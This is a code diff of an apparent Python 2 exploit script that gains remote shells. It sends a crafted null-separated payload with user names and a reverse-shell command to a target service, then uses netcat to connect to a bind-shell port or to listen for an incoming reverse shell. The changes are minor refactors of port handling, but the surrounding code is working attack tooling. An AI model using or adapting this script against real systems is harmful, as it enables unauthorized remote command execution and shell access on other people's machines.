@@ -24,8 +24,8 @@ def RunBindShell():
     time.sleep(0.5)
     test = s.recv(1024)
     s.close()
-    print 'Using Netcat To Connect To %s On Port %s\nType Exit Into The Shell Properly Kill The Open Port\n----------------------------------------------------'% (host, str(bindport))
-    subprocess.call(['nc' , str(host), str(bindport)])
+    print 'Using Netcat To Connect To %s On Port %s\nType Exit Into The Shell Properly Kill The Open Port\n----------------------------------------------------'% (host,bindport)
+    subprocess.call(['nc' , str(host), bindport])
     
 def RunReverseShell():
     uselocalip = raw_input('Get Ip Automatically? y/n:')
@@ -40,8 +40,8 @@ def RunReverseShell():
     SEND="%s\0%s\0%s\0" % (fromuser, username, REVERSESHELL)
     s.send("\0")
     s.send(SEND)
-    print 'Using Netcat To Listen To On Port %s\nType Exit Into The Shell Properly Kill The Open Port\n----------------------------------------------------'% (str(bindport))
-    subprocess.call(['nc' ,'-lp', str(bindport)])
+    print 'Using Netcat To Listen To On Port %s\nType Exit Into The Shell Properly Kill The Open Port\n----------------------------------------------------'% bindport
+    subprocess.call(['nc' ,'-lp', bindport])
     time.sleep(0.5)
     test = s.recv(1024)
     s.close()
@@ -55,15 +55,15 @@ else:
     fromuser = sys.argv[2]
     username = sys.argv[3]
 
-startport,endport = 600,900
-myport =  random.randrange(startport, endport)
-startbindport,endbindport = 5000,6000
-bindport =  random.randrange(startbindport, endbindport)
+myport =  random.randrange(600, 900)
+bindport =  str(random.randrange(5000,6000))
+
+
 
 payloadtype = raw_input('------------------------\n1.)Reverse Shell \n2.)Bind Shell\n------------------------\nChoose Your Option:')
-if payloadtype ==str("2"):
+if payloadtype ==("2"):
     RunBindShell()
-elif payloadtype ==str("1"):
+elif payloadtype ==("1"):
     RunReverseShell()
 else:
     print "Invalid Option"
